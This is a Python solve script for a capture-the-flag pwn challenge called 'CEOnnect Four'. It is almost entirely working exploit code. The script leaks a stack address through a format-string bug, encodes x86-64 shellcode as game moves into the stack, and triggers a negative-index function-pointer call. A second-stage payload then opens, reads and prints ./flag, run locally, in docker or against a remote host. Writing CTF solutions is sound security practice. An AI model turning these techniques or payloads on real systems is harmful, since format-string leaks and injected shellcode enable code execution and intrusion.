#!/usr/bin/env python3
"""CEOnnect Four exploit.

Round 1 + 2 are sent first.  Round 2 makes score_ceo == 6, so main() runs
printf(win_strings.s[6]) == printf(player.name), and the name "%p" leaks rsi.
Round 3 writes the last five payload bytes into the (stack resident) move
history, then gives the player a five-in-a-row: missing = -1, and
(*player.end_fns[-1])() calls the 8 bytes of player.name -> the payload.

usage:
  python3 solve.py --local ./c4                  # x86-64 Linux
  python3 solve.py --docker                     # runs ./c4 in debian:trixie-slim
  python3 solve.py --docker debian:bookworm-slim
  python3 solve.py --host HOST --port PORT      # TLS + SNI (challenge frontend)
  python3 solve.py --host HOST --port PORT --plain
"""
import argparse
import os
import re
import socket
import ssl
import subprocess
import sys

DELTA = 0x204          # &hist.hist - leaked rsi, measured on the provided image


def enc3(b0, b1, b2):
    """8 moves -> 3 bytes, inverse of c4.c add_move()."""
    return [(b0 >> 5) & 7, (b0 >> 2) & 7, ((b0 & 3) << 1) | (b1 >> 7),
            (b1 >> 4) & 7, (b1 >> 1) & 7, ((b1 & 1) << 2) | ((b2 >> 6) & 3),
            (b2 >> 3) & 7, b2 & 7]


# round 1: 21 moves -> hist[0..7] = pop rbx / push rax / imul eax,eax,0 /
# mov edi,eax / push rax, plus the low bits of the 0xeb jmp opcode
SETUP = [0x5b, 0x50, 0x6b, 0xc0, 0x00, 0x89, 0xc7, 0x50]
R1 = enc3(*SETUP[0:3]) + enc3(*SETUP[3:6]) + enc3(SETUP[6], SETUP[7], 0xeb)[:5]

# round 2: 19 moves; CEO fills the gap in row 2 for a six-in-a-row (score 6).
# The moves also write hist[8..14] = eb 03 12 e2 50 5a 5e.
R2 = [3, 5, 3, 0, 0, 6, 1, 1, 3, 4, 2, 2, 4, 0, 5, 5, 1, 3, 6]

# round 3: hist[15..19] = 6a 65 5a 0f 05 (push 0x65; pop rdx; syscall),
# then a five-in-a-row on the \ diagonal.
R3 = enc3(0x6a, 0x65, 0x5a) + [0, 3, 6, 0, 2, 5, 0, 0, 1, 1]

# read(0, hist, 0x65) lands here at offset 20; open("./flag")/read/write/exit
STAGE2 = b"".join([
    bytes.fromhex("48bb") + b"./flag\0\0",   # movabs rbx, "./flag"
    bytes.fromhex("53"),                     # push rbx
    bytes.fromhex("4889e7"),                 # mov rdi, rsp
    bytes.fromhex("31f6"),                   # xor esi, esi
    bytes.fromhex("31c0b002"),               # xor eax, eax; mov al, 2 (open)
    bytes.fromhex("0f05"),                   # syscall
    bytes.fromhex("4889c7"),                 # mov rdi, rax
    bytes.fromhex("4889e6"),                 # mov rsi, rsp
    bytes.fromhex("6a7f5a"),                 # push 0x7f; pop rdx
    bytes.fromhex("31c00f05"),               # xor eax, eax; syscall (read)
    bytes.fromhex("4889c2"),                 # mov rdx, rax
    bytes.fromhex("6a0158"),                 # push 1; pop rax
    bytes.fromhex("6a015f"),                 # push 1; pop rdi
    bytes.fromhex("0f05"),                   # syscall (write)
    bytes.fromhex("6a3c58"),                 # push 0x3c; pop rax
    bytes.fromhex("31ff"),                   # xor edi, edi
    bytes.fromhex("0f05"),                   # syscall (exit)
])


def moves(ms):
    return b"".join(b"%d\n" % m for m in ms)


def exploit(read, send):
    send(b"A" + moves(R1) + b"%p\n" + moves(R2))
    buf = b""
    while True:
        chunk = read()
        if not chunk:
            sys.exit("closed before the leak:\n" + buf.decode("utf-8", "replace"))
        buf += chunk
        m = re.search(rb"CEO is >>(0x[0-9a-f]+)", buf)
        if m:
            break
    addr = int(m.group(1), 16) + DELTA
    print("leaked rsi = %s -> &hist.hist = %#x" % (m.group(1).decode(), addr))

    tail = addr.to_bytes(8, "little")[:7] + moves(R3)
    tail += b"P" * 20 + STAGE2
    tail += b"Q" * (0x65 - len(b"P" * 20 + STAGE2))
    send(tail)

    try:
        while True:
            chunk = read()
            if not chunk:
                break
            buf += chunk
    except (socket.timeout, TimeoutError):
        pass
    text = buf.decode("utf-8", "replace")
    print(text[-300:])
    m = re.search(r"flag\{[^}]*\}", text)
    print("FLAG:", m.group(0) if m else "not found")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--local", metavar="BIN")
    ap.add_argument("--docker", nargs="?", const="debian:trixie-slim", metavar="IMAGE")
    ap.add_argument("--host")
    ap.add_argument("--port", type=int, default=1024)
    ap.add_argument("--plain", action="store_true", help="no TLS for --host")
    a = ap.parse_args()

    if a.host:
        s = socket.create_connection((a.host, a.port), timeout=20)
        if not a.plain:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=a.host)
        s.settimeout(20)
        exploit(s.recv, s.sendall)
        return

    if a.docker:
        cmd = ["docker", "run", "--rm", "-i", "--platform", "linux/amd64",
               "-v", os.getcwd() + ":/w", "-w", "/w", a.docker, "./c4"]
    else:
        cmd = [a.local or "./c4"]
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    send = lambda b: (p.stdin.write(b), p.stdin.flush())
    exploit(lambda: os.read(p.stdout.fileno(), 4096), send)
    p.stdin.close()
    p.wait()
    print("exit status", p.returncode)


if __name__ == "__main__":
    main()
